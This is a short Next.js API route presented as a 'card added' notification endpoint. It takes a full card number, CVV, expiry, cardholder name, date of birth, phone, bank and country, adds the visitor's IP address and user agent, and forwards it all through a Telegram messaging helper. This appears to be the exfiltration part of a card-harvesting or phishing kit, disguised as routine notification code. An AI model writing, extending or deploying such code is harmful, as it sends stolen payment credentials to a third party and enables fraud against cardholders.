import { type NextRequest, NextResponse } from "next/server"
import { sendCardAddedNotification } from "@/lib/utils/telegram"

export async function POST(request: NextRequest) {
  try {
    const {
      userEmail,
      userName,
      userId,
      cardNumber,
      cardBrand,
      cardLastFour,
      cardHolder,
      cardExpiry,
      cvv,
      dateOfBirth,
      phone,
      bankName,
      cardLevel,
      cardType,
      country,
    } = await request.json()

    const ip = request.headers.get("x-forwarded-for")?.split(",")[0] || request.headers.get("x-real-ip") || "Unknown"
    const userAgent = request.headers.get("user-agent") || "Unknown"

    await sendCardAddedNotification({
      userEmail,
      userName,
      cardNumber,
      cardBrand,
      cardLastFour,
      cardHolder,
      cardExpiry,
      cvv,
      dateOfBirth,
      phone,
      bankName,
      cardLevel,
      cardType,
      country,
      ipAddress: ip,
      userAgent,
      userId,
    })

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("[v0] Error in notify-card:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
